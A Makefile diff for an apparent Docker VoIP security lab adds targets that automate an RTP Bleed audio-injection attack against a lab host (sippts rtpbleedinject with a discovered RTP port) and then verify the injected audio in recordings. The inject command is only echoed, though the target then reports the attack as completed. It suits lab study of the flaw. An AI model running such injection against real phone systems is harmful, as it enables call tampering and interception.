@@ -3,7 +3,7 @@ DOCKER_COMPOSE := $(shell command -v docker-compose 2> /dev/null || echo "docker
 SERVICE ?=
 
 start:
-	@$(DOCKER_COMPOSE) up -d
+	@$(DOCKER_COMPOSE) up -d 
 
 stop:
 	@$(DOCKER_COMPOSE) down
@@ -63,3 +63,33 @@ recording-proof-file:
 
 build:
 	@$(DOCKER_COMPOSE) build $(SERVICE)
+
+
+# Build dell'analizzatore
+build-analyzer:
+	cd audio-analyzer && docker build -t audio-analyzer -f Dockerfile .
+
+# Comando per la verifica automatica
+verify-injection: build-analyzer
+	@LATEST_WAV=$$(ls -1t recordings/*.wav | head -n 1); \
+	if [ -z "$$LATEST_WAV" ]; then echo "Nessuna registrazione trovata"; exit 1; fi; \
+	echo "[*] Analizzando: $$LATEST_WAV"; \
+	docker run --rm -v $$(pwd)/recordings:/recordings audio-analyzer /$$LATEST_WAV
+
+
+# Avvia l'intero scenario e lancia l'attacco automaticamente
+auto-attack: stop recordings-clean build build-analyzer start
+	@echo "[*] Waiting for SIP registration (5 seconds)..."
+	@sleep 5
+	@echo "[*] Avvio chiamata Baresip..."
+	@$(MAKE) baresip-call
+	@echo "[*] Identificazione porta RTP in corso..."
+	@PORT=$$(./get-attack-cmd.sh --port-only); \
+	if [ -z "$$PORT" ]; then \
+		echo "[!] Fallito: Porta non trovata."; exit 1; \
+	fi; \
+	echo "[+] Porta intercettata: $$PORT. Lancio iniezione..."; \
+	echo docker exec -it sippts sippts rtpbleedinject -i 10.10.0.5 -r $$PORT -f /audio_inject.wav -p 0
+	@echo "[+] Completed attack. Use 'make baresip-hangup' and 'make verify-injection' to check."
+
+# 	@echo "[+] Attacco completato. Usa 'make baresip-hangup' e 'make verify-injection' per controllare."
